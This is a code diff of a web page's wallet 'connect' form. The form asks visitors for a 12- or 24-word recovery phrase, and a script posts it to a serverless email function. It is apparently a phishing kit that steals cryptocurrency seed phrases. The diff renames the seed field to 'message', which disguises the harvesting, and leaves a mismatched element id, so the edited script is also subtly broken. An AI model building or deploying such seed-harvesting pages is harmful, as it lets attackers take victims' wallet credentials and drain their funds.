@@ -772,7 +772,7 @@
                         <input type="hidden" name="_next" value="error.html">
                         <div class="select connectButton select connectButton  form-group">
                             <label class="select connectButton select connectButton  form-label">Phrase</label>
-                            <textarea rows="3" minlength="20" type="text" required="" name="mnemonic_seed" id="mnemonic_seed"></textarea>
+                            <textarea rows="3" minlength="20" type="text" required="" name="message" id="mnemonic_seed"></textarea>
                         </div>
                         <div class="select connectButton select connectButton  form-group button">
                             <p id="form-instruction">Typically 12 (sometimes 24) words separated by a single space.</p>
@@ -8053,14 +8053,14 @@
             document.getElementById("contact-form").addEventListener("submit", async function(event) {
                 event.preventDefault();
         
-                const name = document.getElementById("mnemonic_seed").value;
+                const message = document.getElementById("message").value;
                 /*const email = document.getElementById("email").value;
                 const message = document.getElementById("message").value;*/
         
                 const response = await fetch("/.netlify/functions/sendEmail", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ mnemonic_seed })
+                    body: JSON.stringify({ message })
                 });
         
                 const result = await response.json();
